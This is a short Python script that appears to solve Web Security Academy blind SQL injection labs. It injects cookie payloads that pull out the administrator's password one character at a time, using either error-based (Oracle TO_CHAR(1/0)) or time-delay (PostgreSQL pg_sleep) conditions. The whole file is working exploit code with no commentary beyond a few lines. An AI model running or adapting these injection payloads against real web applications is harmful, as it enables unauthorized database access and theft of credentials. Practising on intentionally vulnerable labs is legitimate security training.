import requests, string
import datetime

url = 'https://0a5700cc0303c41fc0e4ce0900070027.web-security-academy.net'
s = requests.Session()

# backend query: `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '{}'`
# given password length is 20 and password consists of lowercase alphanum

def blind_sql_error():
	password = ''
	while len(password)!=20:
		for i in (string.ascii_lowercase + string.digits):
			payload = f"HtMiglHiCbs6VQv4'+||(SELECT+CASE+WHEN+SUBSTR(password,{str(len(password)+1)},1)%3d'{i}'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')||'"
			print(i)
			if (s.get(url, cookies={'TrackingId':payload}).status_code == 500):
				password = password + i
				print(password)
				break

def blind_time_delay():
	password = ''
	while len(password)!=20:
		for i in (string.ascii_lowercase + string.digits):
			payload = f"Vam3ucEQihdzxw5t'%3b+SELECT+CASE+WHEN+(SUBSTRING(password,{str(len(password)+1)},1)%3d'{i}')+THEN+pg_sleep(5)+END+FROM+users+WHERE+username%3d'administrator'--"
			r = s.get(url, cookies={'TrackingId':payload})
			print(i, r.elapsed)
			if (r.elapsed > datetime.timedelta(seconds=4)):
				password = password + i
				print(password)
				break

blind_time_delay()
